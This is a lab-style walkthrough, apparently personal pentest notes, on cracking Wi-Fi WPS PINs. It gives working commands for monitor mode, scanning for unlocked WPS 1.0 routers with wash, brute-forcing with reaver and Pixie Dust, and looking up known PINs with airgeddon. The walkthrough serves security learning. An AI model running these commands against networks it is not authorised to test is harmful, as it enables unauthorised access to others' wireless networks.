
> [!info]
> This was performed on a controlled network, meaning everything performed was both legal and ethical.

This walkthrough does not contain in-depth explanations of every tool used.  For references to the tools used, see my [Wireless Cheatsheet](../Tools/Wireless%20Cheatsheet.md).

## Overview
---
WPS (Wi-Fi Protected Setup) is a network setup feature that provides simplified methods for connecting devices to a Wi-Fi network. It doesn't replace or dictate the choice of the underlying security protocol (e.g., WPA2-PSK, WEP, etc.). Instead, it offers a convenient way to establish a connection with either WPA2-PSK or WEP as the security protocol.

The predominant methods of WPS connections are:
- Push Button Configuration (e.g., pressing on a physical button on the Wi-Fi router)
- PIN Entry (generally an 8-digit numerical PIN)

This means for authentication, a bad actor needs to find a network that supports WPS (below version 2.0, which introduced bruteforce protections) and crack the PIN.

## Cracking the WPS PIN
---

(Example using tools such as "wash", "reaver", and "airgeddon")

```bash
# View Current WiFi Driver
sudo airmon-ng
# Create Monitor Interface
sudo airmon-ng start wlan0

### or ###

# Add a separate monitor mode interface based on an existing interface
sudo iw dev <interface> interface add <monitor_name> type monitor
# Bring new interface up
sudo ip link set <monitor_name> up
```

Once we have our monitor interface setup, we can use it to scan for broadcasting SSID's that support WPS.

```shell
sudo wash -i wlan0mon
```

**Example output:**
![[Pasted image 20231015005548.png]]
*(WPS 2.0 introduced bruteforce protections, meaning we want to find a broadcast with WPS 1.0 that is NOT locked. Meaning we're looking for:  "Lck : no")*

Once we find a vulnerable target, we can then attempt to exploit them using a tool called "reaver". 
```shell
sudo reaver -b <bssid> -c <channel> -i wlan0mon -v
```

This brute force is very time consuming, and take upwards of 6 hours.  The *potential* work around is using the ``-K`` parameter which will utilize ``PixieWPS``

```shell
sudo reaver -b <bssid> -c <channel> -i wlan0mon -v -K
```

**Example Output:**
![[Pasted image 20231015005530.png]]

If that still failed, we can use check to see if the device uses an empty pin using the ``-p`` parameter.

To check for known PINs, we can use the "airgeddon" project.
```shell
sudo apt install airgeddon
source /usr/share/airgeddon/known_pins.db
echo ${PINDB["<first_half_of_bssid"]}
```

If there the above code returns any  values, we can try the returned PINs manually with reaver.
